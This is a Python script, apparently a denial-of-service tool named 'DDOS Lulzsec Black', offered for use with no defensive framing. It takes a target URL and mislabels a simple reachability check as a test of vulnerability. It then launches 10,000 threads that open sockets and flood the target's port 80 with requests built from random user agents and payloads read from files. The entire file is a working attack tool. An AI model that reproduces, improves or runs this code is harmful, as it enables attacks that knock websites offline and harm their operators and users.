import socket
import random
import threading
import pyfiglet
import requests
from urllib.parse import urlparse
import time

# Function to check if target is protected
def check_protection(target_url):
    try:
        response = requests.get(target_url)
        if response.status_code == 200:
            print(f"Target {target_url} is reachable and vulnerable.")
        else:
            print(f"Target {target_url} responded with status code {response.status_code}. It might be protected.")
        return response.status_code == 200
    except Exception as e:
        print(f"Error checking target {target_url}: {e}")
        return False

# Function for DoS attack
def dos_attack(target_url, user_agent, payload):
    try:
        parsed_url = urlparse(target_url)
        target_ip = socket.gethostbyname(parsed_url.netloc)
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, 80))  # Assuming HTTP port is 80
        
        # Prepare HTTP request
        headers = f"{payload}\r\nHost: {parsed_url.netloc}\r\nUser-Agent: {user_agent}\r\n\r\n"
        client.send(headers.encode())
        
        print(f"Sent packet to {target_url}")
        response = client.recv(4096)
        
        if b"200 OK" in response:
            print("Response: 200 OK - Attack successful.")
        elif b"404 Not Found" in response:
            print("Response: 404 Not Found - Attack detected or site is protected.")
        else:
            print("Response:", response.decode())
        
        client.close()
    except Exception as e:
        print(f"Error: {e}")

# Function for DDoS attack with multiple threads
def ddos_attack(target_url, num_threads, user_agents_file, payloads_file):
    try:
        with open(user_agents_file, 'r') as file:
            user_agents = file.readlines()
            user_agents = [agent.strip() for agent in user_agents]
        
        with open(payloads_file, 'r') as file:
            payloads = file.readlines()
            payloads = [payload.strip() for payload in payloads]
        
        threads = []
        
        for i in range(num_threads):
            user_agent = random.choice(user_agents)
            payload = random.choice(payloads)
            thread = threading.Thread(target=dos_attack, args=(target_url, user_agent, payload))
            thread.start()
            threads.append(thread)
            time.sleep(0.01)  # Pause briefly to spread out thread creation
        
        for thread in threads:
            thread.join()
    
    except Exception as e:
        print(f"Error in DDoS attack: {e}")

if __name__ == "__main__":
    ascii_banner = pyfiglet.figlet_format("DDOS Lulzsec Black")
    print(ascii_banner)

    target_url = input("Enter target URL (e.g., http://example.com): ")
    user_agents_file = "User-Agents.txt"  # File containing user agents
    payloads_file = "Payloads.txt"  # File containing payloads
    
    if check_protection(target_url):
        num_threads = 10000  # Number of threads for DDoS attack
        print(f"Launching DoS attack with {num_threads} threads on {target_url}...")
        ddos_attack(target_url, num_threads, user_agents_file, payloads_file)
    else:
        print("Target is not vulnerable or unreachable.")
